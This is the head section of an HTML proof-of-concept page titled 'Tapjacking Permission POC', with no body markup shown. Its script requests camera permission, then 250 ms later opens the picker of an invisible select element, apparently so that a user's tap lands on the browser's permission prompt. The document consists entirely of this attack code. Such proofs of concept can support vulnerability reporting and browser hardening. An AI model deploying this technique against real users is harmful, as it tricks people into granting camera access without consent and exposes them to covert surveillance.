<!DOCTYPE html>

<head>
  <title>Tapjacking Permission POC</title>

  <style>
    body {
      margin: 10vh 10vw;

      overflow: hidden;

      position: relative;
    }

    button {
      font-size: 25px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    select {
      opacity: 0;
    }

    /* 👇 NEW: circle button */
    .circle-btn {
      position: absolute;
      bottom: 20%;
      right: 20%;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background-color: #ff4444;
      border: none;
      cursor: pointer;
    }
  </style>

  <script>
    function requestCameraPermission() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function () {
          console.log('Camera permission granted.');
        })
        .catch(function (error) {
          console.error('Error accessing the camera:', error);
        });
    }

    function handleClick() {
      requestCameraPermission();
      setTimeout(function() {
        document.getElementById("selectme").showPicker();
      }, 250);
    }
  </script>
</head>
